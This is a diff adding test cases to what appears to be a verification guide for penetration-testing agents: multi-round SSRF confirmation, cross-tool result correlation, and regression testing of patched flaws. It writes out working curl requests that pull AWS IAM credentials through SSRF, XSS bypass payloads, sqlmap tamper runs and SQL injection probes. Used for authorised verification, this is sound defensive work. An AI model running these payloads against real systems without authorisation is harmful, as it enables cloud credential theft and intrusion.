@@ -298,3 +298,234 @@ A previously confirmed SQL injection vulnerability has been patched. Verify the 
 | SQLmap comprehensive | No injection found |
 | Completeness | All related endpoints verified |
 | Verdict | PATCHED / PARTIALLY PATCHED / NOT PATCHED |
+
+---
+
+## TC-VL-006: Multi-Round Verification
+
+### Scenario
+A complex vulnerability (chained SSRF leading to cloud metadata access) requires multiple verification rounds with escalating payload sophistication. Initial confirmation succeeds, but the full impact chain needs independent validation at each stage.
+
+### Pre-conditions
+- Target web application with URL-fetching functionality
+- Cloud-hosted target (AWS/GCP) with metadata API reachable from SSRF
+- interactsh or Burp Collaborator for out-of-band callbacks
+- Three verification agents available (or three independent passes)
+
+### Test Steps
+
+1. **Phase 1: Pre-Condition Check**
+   - Success criteria: (a) SSRF confirmed via callback, (b) cloud metadata returned, (c) IAM credentials exfiltrated
+   - Baseline: normal URL fetch returns expected content
+   - Define round thresholds: Round 1 = confirm SSRF, Round 2 = confirm metadata, Round 3 = confirm credential access
+
+2. **Round 1: Initial SSRF Confirmation**
+   ```bash
+   # Start callback server
+   interactsh-client &
+
+   # Test basic SSRF
+   curl -s -X POST "http://target/api/fetch" \
+     -d '{"url": "http://<callback>/ssrf-test"}'
+   ```
+   - Verify callback received from target IP
+   - Record response time, source IP, and User-Agent
+
+3. **Round 2: Cloud Metadata Access**
+   ```bash
+   # AWS IMDSv1 test
+   curl -s -X POST "http://target/api/fetch" \
+     -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
+
+   # AWS IMDSv2 test (if IMDSv1 blocked)
+   # First get a token
+   curl -s -X POST "http://target/api/fetch" \
+     -d '{"url": "http://169.254.169.254/latest/api/token", "method": "PUT", "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}}'
+   ```
+   - Verify IAM role name returned
+   - Cross-validate: both direct fetch and callback-based approaches confirm metadata access
+
+4. **Round 3: Full Chain Validation**
+   ```bash
+   # Attempt to retrieve temporary credentials
+   curl -s -X POST "http://target/api/fetch" \
+     -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"}'
+   ```
+   - Verify response contains AccessKeyId, SecretAccessKey, Token
+   - **STOP**: do not use credentials — document only
+
+5. **Phase 5: False Positive Elimination**
+   - Is this a honeypot returning fake metadata? Compare response structure to real AWS IMDS
+   - Is this cached content from a previous test? Add unique identifiers to each request
+   - Is the cloud metadata actually sensitive, or is this a non-production role with no permissions?
+
+6. **Phase 6: Evidence Documentation**
+   - Compile three-round verification report
+   - Each round must show: payload used, response received, independent confirmation method
+   - Final verdict: CONFIRMED with full chain, PARTIAL if metadata only, FALSE POSITIVE if no SSRF
+
+### Expected Outcomes
+
+| Round | Objective | Result |
+|-------|-----------|--------|
+| Round 1 | SSRF confirmed via callback | Callback received from target IP |
+| Round 2 | Cloud metadata accessible | IAM role name returned |
+| Round 3 | Full chain validated | Temporary credentials returned (documented, not used) |
+| FP elimination | Not cached, not honeypot | Unique response per request, matches real IMDS format |
+| Evidence | Three-round report with CONFIRMED verdict | Complete chain documented |
+
+---
+
+## TC-VL-007: Cross-Skill Result Validation
+
+### Scenario
+Two different security skills (Network Pentest and Web Application Testing) independently discover overlapping findings for the same target. Validate that results are consistent across skills and identify any discrepancies that indicate false positives in either skill.
+
+### Pre-conditions
+- Target with both network services and web application
+- Network Pentest agent completed scanning (nmap, nikto)
+- Web Application Testing agent completed assessment (Burp, manual testing)
+- Both skill results available in standardized format
+- Access to both sets of raw evidence files
+
+### Test Steps
+
+1. **Phase 1: Pre-Condition Check**
+   - Success criteria: overlapping findings are consistent, discrepancies are explained
+   - Collect both result sets and normalize to common format
+
+2. **Phase 2: Result Correlation**
+   ```bash
+   # Extract open ports from network scan
+   nmap -sV -sC target.lab | grep "open" > network-services.txt
+
+   # Extract web findings from web assessment
+   cat web-findings.json | jq -r '.[] | "\(.title) - \(.url) - \(.severity)"' > web-findings.txt
+
+   # Cross-correlate: if network scan shows HTTP on port 80 but web scan shows it as closed
+   # that is a discrepancy requiring investigation
+   ```
+
+3. **Phase 3: Overlap Analysis**
+   - Map network services to web findings: does every open HTTP port have corresponding web findings?
+   - Map web findings to network services: does every web finding correspond to a confirmed open port?
+   - Identify discrepancies:
+     - Network scan reports service X, web scan does not cover it
+     - Web scan reports vulnerability on port Y, but network scan shows port Y closed
+     - Severity differs between the two assessments for the same finding
+
+4. **Phase 4: Independent Re-verification of Discrepancies**
+   ```bash
+   # For each discrepancy, run a targeted third verification
+   # Example: network says port 8443 is open, web scan missed it
+   nmap -p 8443 -sV target.lab
+   curl -sk https://target.lab:8443/ -o /dev/null -w "HTTP:%{http_code}\n"
+   nikto -h https://target.lab:8443/
+   ```
+
+5. **Phase 5: False Positive Identification**
+   - Discrepancies may indicate: (a) one skill has false positives, (b) timing difference (service went down between scans), (c) scope gap (one skill did not cover that endpoint)
+   - For each discrepancy, determine root cause and document
+
+6. **Phase 6: Evidence Documentation**
+   - Produce cross-skill validation matrix:
+
+### Expected Outcomes
+
+| Correlation Check | Expected Result |
+|-------------------|-----------------|
+| Network services vs web findings | All open HTTP ports have corresponding web assessment entries |
+| Web findings vs network services | All web findings reference confirmed-open ports |
+| Severity consistency | Same vulnerability rated similarly across skills (+/- 1 level) |
+| Discrepancies resolved | Each discrepancy explained with root cause |
+| Coverage gaps | Any endpoint missed by both skills flagged as gap |
+
+| Finding | Network Skill | Web Skill | Status |
+|---------|---------------|-----------|--------|
+| SSH on port 22 | Confirmed | N/A | Consistent (web skill scope excludes non-HTTP) |
+| SQLi on /search | N/A | Confirmed | Consistent (network skill does not test web logic) |
+| HTTP on 8443 | Open, HTTPS | Not tested | Discrepancy — web skill gap |
+| XSS on /login | N/A | Medium | N/A (web-only finding) |
+
+---
+
+## TC-VL-008: Automated Regression Verification
+
+### Scenario
+A web application has undergone three rounds of remediation for a set of 12 vulnerabilities. Run automated regression testing to verify all patches hold while also testing for new bypass variants introduced by the fixes.
+
+### Pre-conditions
+- Original vulnerability report with 12 findings (documented payloads and expected blocked behavior)
+- Remediation report from development team
+- Target application accessible for retesting
+- sqlmap, Burp Suite, curl available
+- Baseline from TC-VL-005 available for reference
+
+### Test Steps
+
+1. **Phase 1: Pre-Condition Check**
+   - Success criteria: all 12 original payloads fail, no new bypass variants succeed
+   - Load original finding set with payloads and endpoints
+
+2. **Phase 2: Automated Original Payload Replay**
+   ```bash
+   # Replay all original payloads and record results
+   while IFS=',' read -r finding_id endpoint payload expected_blocked; do
+     response=$(curl -s -w "\n%{http_code}" "$endpoint" -d "param=$payload")
+     http_code=$(echo "$response" | tail -1)
+     echo "$finding_id,$http_code,$expected_blocked" >> regression-results.csv
+   done < original-payloads.csv
+
+   # Check for any regressions (previously blocked, now unblocked)
+   grep -v ",403,blocked\|,400,blocked\|,401,blocked" regression-results.csv | grep "blocked" > regressions.txt
+   ```
+
+3. **Phase 3: Bypass Variant Generation and Testing**
+   ```bash
+   # For each original SQL injection, generate and test 5 encoding variants
+   sqlmap -u "http://target/page?id=1" --batch --tamper=space2comment,between,randomcase --level=3
+
+   # For XSS findings, test modern bypass vectors
+   for payload in '<img/src=x onerror=alert(1)>' '<svg/onload=alert(1)>' '{{7*7}}' '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">' 'javascript:alert(1)'; do
+     curl -s "http://target/search?q=$(python3 -c 'import urllib.parse; print(urllib.parse.quote("'"'$payload'"'"))')" | grep -i "alert(1)"
+   done
+   ```
+
+4. **Phase 4: New Endpoint Coverage**
+   - Verify that fixes were applied to ALL endpoints sharing the same code pattern, not just the originally reported endpoint
+   ```bash
+   # Find all endpoints using the same parameter pattern
+   ffuf -u "http://target/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200 | tee new-endpoints.txt
+
+   # Test each new endpoint with original payload patterns
+   for endpoint in $(cut -d' ' -f1 new-endpoints.txt); do
+     curl -s "$endpoint?id=1'+OR+1=1--" | grep -iE "error|syntax|sql" && echo "REGRESSION: $endpoint"
+   done
+   ```
+
+5. **Phase 5: Regression Trend Analysis**
+   - Compare results across remediation rounds:
+     - Round 1: 12 vulnerabilities found
+     - Round 2: 3 remaining (partial fix)
+     - Round 3: 0 original + 0 new variants = PASS
+   - Flag any finding that regresses (was blocked in Round 2 but unblocked in Round 3)
+
+6. **Phase 6: Evidence Documentation**
+   - Generate regression report:
+
+### Expected Outcomes
+
+| Check | Expected Result |
+|-------|-----------------|
+| Original payload replay | All 12 payloads return blocked/sanitized (400/403/empty response) |
+| Bypass variants | All encoding and modern bypass variants also blocked |
+| New endpoint coverage | No new endpoints share the vulnerable pattern unfixed |
+| Regression trend | Monotonic decrease in findings across rounds (no regressions) |
+| Automated pass/fail | PASS: 0 regressions, 0 new variants. FAIL: any regression or new variant |
+
+| Finding ID | Original Status | Round 2 | Round 3 (Current) | Verdict |
+|------------|----------------|---------|-------------------|---------|
+| SQLI-001 | Confirmed | Blocked | Blocked | PASS |
+| XSS-002 | Confirmed | Blocked | Blocked | PASS |
+| IDOR-003 | Confirmed | Still present | Blocked | PASS (fixed in R3) |
+| SSRF-004 | Confirmed | Blocked | Blocked | PASS |
